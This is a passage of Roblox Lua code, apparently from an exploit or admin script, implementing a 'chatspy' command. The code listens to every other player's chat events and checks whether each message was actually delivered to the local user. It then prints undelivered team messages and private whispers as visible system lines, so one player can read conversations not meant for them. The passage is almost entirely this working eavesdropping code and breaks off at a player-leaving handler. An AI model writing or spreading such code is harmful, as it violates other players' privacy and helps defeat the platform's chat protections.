						if cmd == "chatspy" then
							MessageProperties = {
								Color = Color3.fromRGB(0, 153, 255); 
								Font = Enum.Font.SourceSansBold;
								TextSize = 18;
							}

							local StarterGui = game:GetService("StarterGui")
							local Players = game:GetService("Players")
							local LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
							local GetMessage = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")

							PlayerMessageLogs = {}

							local function onChatted(Player, Message)
								local HiddenMessage = true

								local CheckMessageHidden = GetMessage.OnClientEvent:Connect(function(Packet, Channel)
									if Packet.SpeakerUserId == Player.UserId and (Channel == "All" or (Channel == "Team" and Players[Packet.FromSpeaker].Team == LocalPlayer.Team) or Channel == "To "..LocalPlayer.Name) then
										HiddenMessage = false
									end
								end)

								wait(1)

								CheckMessageHidden:Disconnect()

								if HiddenMessage then
									if Message:sub(1, 3) == "/t " then
										PlayerMessageLogs[Player.Name] = "Team"
									elseif Message:sub(1, 3) == "/w " then
										PlayerMessageLogs[Player.Name] = "To "..Message:split(" ")[2]
									end
								else
									PlayerMessageLogs[Player.Name] = "All"
								end

								if PlayerMessageLogs[Player.Name] ~= "All" then
									local PacketMessage = ""
									local MessageWords = Message:split(" ")
									if Message:sub(1, 1) == "/" then
										if PlayerMessageLogs[Player.Name]:sub(1, 3) == "To " then
											for i, v in pairs(MessageWords) do
												if MessageWords[i + 2] then
													PacketMessage = PacketMessage.." "..MessageWords[i + 2]
												end
											end
										else
											for i, v in pairs(MessageWords) do
												if MessageWords[i + 1] then
													PacketMessage = PacketMessage.." "..MessageWords[i + 1]
												end
											end
										end
									end
									MessageProperties.Text = "{"..PlayerMessageLogs[Player.Name].."} ".."["..Player.Name.."]: "..PacketMessage:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
									StarterGui:SetCore("ChatMakeSystemMessage", MessageProperties)
								end
							end

							for i, Player in pairs(Players:GetPlayers()) do
								PlayerMessageLogs[Player.Name] = "All"
								Player.Chatted:Connect(function(Message)
									if Message:sub(1, 3) == "/e " and Player.Name ~= LocalPlayer.Name then
										MessageProperties.Text = "{Emote} ".."["..Player.Name.."]: "..Message:sub(4):gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
										StarterGui:SetCore("ChatMakeSystemMessage", MessageProperties)
									elseif Player.Name ~= LocalPlayer.Name then
										onChatted(Player, Message)
									end
								end)
							end

							Players.PlayerAdded:Connect(function(Player)
								PlayerMessageLogs[Player.Name] = "All"
								Player.Chatted:Connect(function(Message)
									if Message:sub(1, 3) == "/e " and Player.Name ~= LocalPlayer.Name then
										MessageProperties.Text = "{Emote} ".."["..Player.Name.."]: "..Message:sub(4):gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
										StarterGui:SetCore("ChatMakeSystemMessage", MessageProperties)
									elseif Player.Name ~= LocalPlayer.Name then
										onChatted(Player, Message)
									end
								end)
							end)

							Players.PlayerRemoving:Connect(function(Player)
